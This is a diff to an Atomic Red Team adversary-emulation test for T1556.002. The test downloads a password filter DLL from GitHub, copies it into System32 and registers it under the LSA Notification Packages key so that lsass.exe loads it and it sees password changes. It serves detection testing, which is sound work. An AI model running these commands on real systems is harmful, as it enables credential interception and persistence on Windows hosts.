@@ -5,28 +5,40 @@ atomic_tests:
   auto_generated_guid: a7961770-beb5-4134-9674-83d7e1fa865c
   description: |
     Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.
+    The binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection
+    Source is in src folder. 
+    This does require a reboot to see the filter loaded into lsass.exe. 
+    It does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.
   supported_platforms:
   - windows
   input_arguments:
-    input_dll:
+    dll_path:
       description: Path to DLL to be installed and registered
       type: Path
-      default: PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll
+      default: PathToAtomicsFolder\T1556.002\bin
+    dll_name:
+      description: Name of the Password Filter
+      type: String
+      default: AtomicRedTeamPWFilter.dll
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      AtomicPasswordFilter.dll must exist on disk at specified location (#{input_dll})
+      AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\#{dll_name})
     prereq_command: |
-      if (Test-Path #{input_dll}) {exit 0} else {exit 1}
+      if (Test-Path #{dll_path}\#{dll_name}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Write-Host "You must provide your own password filter dll"
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll" -OutFile "#{dll_path}\#{dll_name}"
   executor:
     command: |
-      $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
+      reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ PathToAtomicsFolder\T1556.002\lsa_backup.reg
+      $passwordFilterName = (Copy-Item "#{dll_path}\#{dll_name}" -Destination "C:\Windows\System32" -PassThru).basename
       $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
       $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
       $notificationPackagesValues += $passwordFilterName
       Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
-      Restart-Computer -Confirm
+    cleanup_command: |
+      reg.exe import PathToAtomicsFolder\T1556.002\lsa_backup.reg
+      remove-item C:\Windows\System32\#{dll_name}
     name: powershell
     elevation_required: true
